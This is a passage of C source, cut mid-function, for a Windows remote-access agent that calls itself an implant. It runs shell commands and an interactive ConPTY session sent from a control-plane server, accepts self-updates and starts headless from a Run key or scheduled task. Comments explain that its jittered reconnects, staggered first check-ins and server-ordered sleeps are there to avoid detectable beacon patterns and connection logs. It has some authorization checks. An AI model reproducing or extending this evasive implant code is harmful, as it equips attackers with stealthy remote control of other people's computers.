            snprintf(auth, sizeof(auth), "{\"type\":\"auth\",\"proof\":\"%s\"}", proof_b64);
            if (tr_send(auth, (int)strlen(auth)) <= 0) {
                INFO("error: auth send failed\n");
                break;
            }
            DBG("answered challenge\n");
        } else if (op_lookup(type) != NULL) {
            /* The gate. Nothing below is reachable except through a table
               entry, so authorization is decided once, from the op's declared
               capability, instead of five branches each remembering to ask
               whether the frame came from a viewer.

               Both checks here are deliberate duplicates of checks the server
               already made. The server can be wrong or compromised; the agent
               is the thing actually standing on someone else's disk, so it
               does not take the server's word for who is asking. */
            const op_def *op = op_lookup(type);
            if (!from_viewer) {
                DBG("[%s] REJECTED (not from a viewer) from %s\n", op->verb, from);
                continue;
            }
            /* Remote exec is the operator's kill switch for anything that runs
               code. Liveness control and self-update are not gated by it: one
               is how you make a box go quiet, the other is how you fix it. */
            if (!g_allow_remote &&
                (strcmp(op->cap, "exec") == 0 || strcmp(op->cap, "shell") == 0)) {
                DBG("[%s] REJECTED (remote exec disabled, needs cap '%s')\n",
                    op->verb, op->cap);
                continue;
            }

            if (strcmp(op->verb, "command") == 0) {
                char id[64] = {0}, cmd[8192] = {0};
                json_str(buf, "id", id, sizeof(id));
                json_str(buf, "data", cmd, sizeof(cmd));
                DBG("[%s] from %s: %s\n", op->name, from, cmd);
                if (cmd_start(from, id, cmd) != 0) {
                    cmd_busy_reply(from, id);
                    continue;
                }
            } else if (strcmp(op->verb, "term-start") == 0) {
                char id[64] = {0};
                json_str(buf, "id", id, sizeof(id));
                DBG("[%s] start session %s\n", op->name, id);
                if (run_interactive(from, id) != 0)
                    term_send("term-exit", "failed to start shell", (int)strlen("failed to start shell"), -1);
            } else if (strcmp(op->verb, "term-input") == 0) {
                char data[32768] = {0};
                /* Reached only after the gate above. term-input writes straight
                   into a live ConPTY, so this is the one that must never be
                   reachable before the origin check. */
                json_str(buf, "data", data, sizeof(data));
                /* data is base64 of the raw keystrokes. data[] holds at most 32767
                   base64 chars, which decodes to 24576 bytes — the old dec[22000]
                   overflowed by ~2.5 KB on a large paste. */
                static unsigned char dec[24576];
                int dl = (int)strlen(data);
                int out = 0;
                for (int i = 0; i + 3 < dl; i += 4) {
                    if (out > (int)sizeof(dec) - 3) break;
                    int a = 0, b = 0, c = 0, d = 0;
                    #define B64VAL(x) \
                        ((x) >= 'A' && (x) <= 'Z' ? (x) - 'A' : \
                         (x) >= 'a' && (x) <= 'z' ? (x) - 'a' + 26 : \
                         (x) >= '0' && (x) <= '9' ? (x) - '0' + 52 : \
                         (x) == '+' ? 62 : (x) == '/' ? 63 : 0)
                    a = B64VAL(data[i]);
                    b = B64VAL(data[i + 1]);
                    c = (data[i + 2] == '=') ? 0 : B64VAL(data[i + 2]);
                    d = (data[i + 3] == '=') ? 0 : B64VAL(data[i + 3]);
                    #undef B64VAL
                    int triple = (a << 18) | (b << 12) | (c << 6) | d;
                    dec[out++] = (unsigned char)((triple >> 16) & 0xff);
                    if (data[i + 2] != '=')
                        dec[out++] = (unsigned char)((triple >> 8) & 0xff);
                    if (data[i + 3] != '=')
                        dec[out++] = (unsigned char)(triple & 0xff);
                }
                term_write_input((char *)dec, out);
            } else if (strcmp(op->verb, "cancel") == 0) {
                /* Kill the command that is running, if there is one. The
                   result of the cancelled command still arrives on its own id
                   and says so in its text, with rc=124; this reply only
                   reports whether there was anything to stop.

                   Terminal sessions are deliberately not touched: they already
                   have shell.close, and killing a shell underneath an operator
                   typing into it is not what "cancel" should mean. */
                char id[64] = {0}, res[256];
                HANDLE child;
                int rc = 1;
                json_str(buf, "id", id, sizeof(id));
                child = (HANDLE)InterlockedCompareExchangePointer(
                            (PVOID volatile *)&g_exec_child, NULL, NULL);
                if (child && InterlockedCompareExchange(&g_exec_active, 0, 0)) {
                    InterlockedExchange(&g_exec_cancel, 1);
                    rc = 0;
                }
                snprintf(res, sizeof(res),
                         "{\"type\":\"cancel-result\",\"to\":\"%s\",\"id\":\"%s\",\"rc\":%d}",
                         from, id, rc);
                tr_send(res, (int)strlen(res));
                DBG("[%s] from %s: rc=%d (nothing running)\n", op->name, from, rc);
            } else if (strcmp(op->verb, "term-end") == 0) {
                DBG("[%s] session ended by viewer\n", op->name);
                term_stop();
            } else if (strcmp(op->verb, "update") == 0) {
                /* Announcement only. The payload follows as a binary frame and
                   is only accepted if it hashes to the digest named here. */
                update_announce(buf);
            } else if (strcmp(op->verb, "sleep") == 0) {
                /* Server-directed quiet. The control plane can tell an implant to
                   drop the link and stay off the network for a while. Without
                   this, an agent with nothing to do still holds a socket open
                   forever: a standing connection, a fixed heartbeat, and a
                   connection log entry on both sides for as long as it is
                   installed. */
                long ms = 0;
                if (!json_num(buf, "ms", &ms) || ms < 0) ms = 0;
                if (ms > 3600000L) ms = 3600000L;   /* an hour is plenty */
                g_sleep_ms = (DWORD)ms;
                INFO("control plane asked this agent to go quiet for %ld s\n", ms / 1000);
                reconnect = 1;
            }
        } else if (strcmp(type, "implants") == 0) {
            /* Operator roster. The control plane only pushes this to viewers
               now; the branch stays so an agent talking to an older server
               degrades to "ignored" rather than to the catch-all below. This
               agent has no use for anyone else's record — it is a target, not
               a peer — so the payload is deliberately not parsed. */
            DBG("implant list update (ignored by the agent)\n");
        } else if (strcmp(type, "signal") == 0) {
            char from[64] = {0};
            json_str(buf, "from", from, sizeof(from));
            DBG("[signal] from %s: %s\n", from, buf);
        } else if (strcmp(type, "command-result") == 0) {
            char id[64] = {0}, data[32768] = {0};
            long rc = -1;
            json_str(buf, "id", id, sizeof(id));
            json_str(buf, "data", data, sizeof(data));
            if (!json_num(buf, "rc", &rc)) rc = -1;
            DBG("RESULT (rc=%ld):\n%s\n", rc, data);
        } else {
            DBG("[msg] %s\n", buf);
        }
        } /* end if (n > 0) */
    }

    /* NOTE: Do NOT call term_stop() here. The terminal session survives
       WS reconnects. The ConPTY keeps running independently. */

    /* Tear down the current socket before returning; connect_mode sets up a
       fresh one. The terminal session deliberately survives this. */
    session_teardown();
    return reconnect ? 2 : 0;
}

/* Auto-reconnect with jittered exponential backoff so a dropped link (idle
   timeout, transient network blip, server restart) doesn't end the tool. The
   attempt counter used to be a local in the function that recursed into itself,
   so it reset on every retry and the delay was always 2 s; it also grew the
   stack by a frame per reconnect. Now it is a plain loop.

   Every delay carries ±50% jitter. A fixed ladder is a fingerprint: it
   reproduces identically after every reboot, every network reset and every
   server restart, which is exactly the regularity a beacon is defined by. */
static int connect_mode(const char *url, const char *name) {
    /* Startup jitter. A fleet that boots together and completes its handshake
       in the same second is a synchronised-beacon shape; spreading first
       contact over a window costs nothing at all and removes it. */
    int boot = jitter_ms(0, env_int("FORZER_STARTUP_JITTER_MS", 45000, 0, 600000));
    if (boot > 0) {
        DBG("startup jitter: waiting %d ms before the first check-in\n", boot);
        Sleep((DWORD)boot);
    }

    int attempt = 0;
    for (;;) {
        int r = session_run(url, name);
        if (r != 2) return r;

        if (g_sleep_ms) {
            DWORD s = g_sleep_ms;
            g_sleep_ms = 0;
            /* Jitter the wake-up too, so a sleep is not a metronome either. */
            DWORD extra = (DWORD)jitter_ms(0, (int)(s / 5) + 1);
            DBG("quiet for %lu ms (+%lu ms of jitter)\n", s, extra);
            Sleep(s + extra);
            attempt = 0;   /* a deliberate sleep is not a failure streak */
            continue;
        }

        attempt++;
        int base = attempt < 6 ? (1 << attempt) : 60;   /* 2,4,8,16,32,60s */
        int delay = jitter_ms(base / 2, base + base / 2);
        DBG("reconnecting in %d s (attempt %d)...\n", delay, attempt);
        Sleep((DWORD)delay * 1000);
    }
}

/* A GUI-subsystem build has no console of its own and its standard handles
   are invalid, so printf() is a no-op. Reattach the parent's console so the
   local prompt still works when a human launched this from a shell, and stay
   silent when the Run key started it with no console anywhere. */
static void attach_parent_console(void) {
    if (GetConsoleWindow()) return;                        /* already have one */
    if (!AttachConsole(ATTACH_PARENT_PROCESS)) return;      /* headless */
    FILE *f;
    freopen_s(&f, "CONOUT$", "w", stdout);
    freopen_s(&f, "CONOUT$", "w", stderr);
    freopen_s(&f, "CONIN$",  "r", stdin);
}

int main(int argc, char **argv) {
    /* Before anything prints, and before any thread exists. */
    attach_parent_console();

    /* Unbuffered stdout: the prompt thread and the socket loop both print.
       Done before any thread exists, and only here — setvbuf() after I/O has
       started is undefined. */
    setvbuf(stdout, NULL, _IONBF, 0);

    /* Whether a person is watching, decided once and before anything that can
       print. The install/config actions below run from the argument loop and
       report through the same channel, so this has to be set before it. */
    resolve_is_console();
    g_interactive = has_console();

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--install") == 0) {
            return do_install();
        } else if (strcmp(argv[i], "--uninstall") == 0) {
            return do_uninstall();
        } else if (strcmp(argv[i], "--write-config") == 0) {
            return do_write_config(1);
        } else if (strcmp(argv[i], "--config") == 0) {
            return do_show_config();
        } else if (strcmp(argv[i], "--ops-out") == 0) {
            /* The file form of --ops. It exists because the release build has
               no console: stdout is unbound there, so the stdout form returns
               exit 0 and no output, and the catalog drift test cannot tell
               that apart from success. */
            if (i + 1 >= argc) {
                INFO("--ops-out needs a file path\n");
                return 2;
            }
            i++;
            if (ops_write_file(argv[i]) != 0) {
                INFO("could not write %s (error %lu)\n", argv[i], GetLastError());
                return 1;
            }
            return 0;
        } else if (strcmp(argv[i], "--ops") == 0) {
            /* What this build implements, as the same JSON the register frame
               carries. Two uses: an operator can ask a binary what it supports
               before pushing it somewhere, and the catalog drift test can
               compare this against shared/ops.json without standing up a
               control plane. */
            char list[256];
            int i;
            ops_json(list, sizeof(list));
            printf("{\"proto\":%d,\"ops\":[%s]}\n", FORZER_PROTO, list);
            return 0;
        } else if (strcmp(argv[i], "--selftest") == 0) {
            /* The handshake is the one part of this agent that must be right
               on the very first run, and it is the part that cannot be
               exercised without a live control plane. This checks the two
               primitives against vectors generated with OpenSSL. */
            return ng_selftest() ? 0 : 1;
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            usage();
            return 0;
        } else if (argv[i][0] == '-') {
            INFO( "unknown option: %s\n\n", argv[i]);
            usage();
            return 2;
        }
    }

    config_t cfg;
    config_resolve(&cfg);

    /* No endpoint configured is a hard stop, not something to fall back from.
       There is no longer a compiled-in default to silently fall back *to*,
       and carrying on with an empty url would produce a connection attempt
       against "" and a reconnect loop that looks like a network fault.

       This is checked before the prompt thread starts, so there is nothing
       left running when we return. The diagnostic goes to raw stderr because
       a scheduled-task launch is exactly who needs to hear it and has no
       console to be interactive about. */
    if (!cfg.url[0]) {
        fprintf(stderr,
                "error: no control-plane endpoint configured.\n"
                "       This build has no built-in server address on purpose.\n"
                "       Set it one of two ways:\n"
                "         FORZER_SERVER=wss://host   (one-off)\n"
                "         --write-config with FORZER_SERVER set (persists it)\n");
        return 4;
    }

    /* Only a human who launched this from a shell gets any output. A scheduled
       task launch has no console, so the whole block below is skipped. */
    int interactive = g_interactive;

    char path[MAX_PATH];
    if (config_path(path, sizeof(path)) && !config_exists(path, sizeof(path)))
        DBG("note: no config file at %s (using environment/defaults)\n", path);

    if (interactive) {
        printf("agent '%s' -> %s\n", cfg.name, cfg.url);
        printf("local prompt: 'list', 'help', 'exit' (read-only — commands come from the control plane)\n");
    }

    /* Started once, for the whole process, and outliving every reconnect. */
    HANDLE prompt = CreateThread(NULL, 0, reader_thread, NULL, 0, NULL);
    if (!prompt) INFO( "warning: local prompt unavailable (stdin thread failed)\n");

    int rc = connect_mode(cfg.url, cfg.name);

    /* The prompt thread parks in fgets on stdin, so it is not joinable and is
       reaped by process exit. Releasing the handle keeps it from being the
       only leak on a clean return. */
    if (prompt) CloseHandle(prompt);
    return rc;
}
